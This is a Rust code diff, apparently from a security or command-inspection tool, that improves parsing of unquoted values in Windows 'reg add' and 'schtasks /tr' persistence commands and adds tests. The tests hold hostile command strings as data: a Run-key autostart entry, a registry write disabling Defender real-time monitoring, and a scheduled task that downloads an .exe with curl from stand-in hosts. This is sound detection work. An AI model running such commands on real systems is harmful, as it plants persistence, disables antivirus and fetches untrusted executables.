@@ -132,7 +132,13 @@ fn reg_data_value(raw: &str) -> Option<String> {
             if rest.is_empty() {
                 continue;
             }
-            return parse_flag_value(raw, span.end - rest.len());
+            let value_start = span.end - rest.len();
+            let value = raw[value_start..].trim_start();
+            if value.starts_with(['"', '\'']) {
+                return parse_flag_value(raw, value_start);
+            }
+            let value_end = reg_unquoted_value_end(raw, &spans[idx..]);
+            return Some(raw[value_start..value_end].trim_end().to_string());
         }
     }
     None
@@ -585,7 +591,13 @@ fn schtasks_task_run(raw: &str) -> Option<String> {
             return Some(raw[value_start..value_end].trim_end().to_string());
         }
         if let Some(value_start) = attached_flag_value_start(raw_token, "/tr") {
-            return parse_flag_value(raw, span.start + value_start)
+            let value_start = span.start + value_start;
+            let value = raw[value_start..].trim_start();
+            if value.starts_with(['"', '\'']) {
+                return parse_flag_value(raw, value_start);
+            }
+            let value_end = schtasks_unquoted_value_end(raw, &spans[idx..]);
+            return Some(raw[value_start..value_end].trim_end().to_string())
                 .filter(|command| persisted_command_looks_dispatchable(command));
         }
     }
@@ -1056,6 +1068,16 @@ mod tests {
     }
 
     #[test]
+    fn reg_data_value_collects_attached_unquoted_command_until_next_reg_option() {
+        let command = reg_data_value(
+            r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d=cmd.exe /c echo hi /f"#,
+        )
+        .expect("attached reg data should parse");
+
+        assert_eq!(command, "cmd.exe /c echo hi");
+    }
+
+    #[test]
     fn reg_data_value_stops_numeric_value_before_force_option() {
         let command = reg_data_value(
             r#"reg add HKLM\Software\Microsoft\Windows Defender /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f"#,
@@ -1146,6 +1168,19 @@ mod tests {
         assert_eq!(
             command,
             "cmd.exe /c curl -o out.exe https://example.test/p.exe"
+        );
+    }
+
+    #[test]
+    fn schtasks_attached_unquoted_task_run_collects_until_next_task_option() {
+        let command = schtasks_task_run(
+            r#"schtasks /create /tn Updater /tr=cmd.exe /c curl -o out.exe https://attached-tr.example/p.exe /sc once /st 00:00"#,
+        )
+        .expect("attached task action should parse");
+
+        assert_eq!(
+            command,
+            "cmd.exe /c curl -o out.exe https://attached-tr.example/p.exe"
         );
     }
 
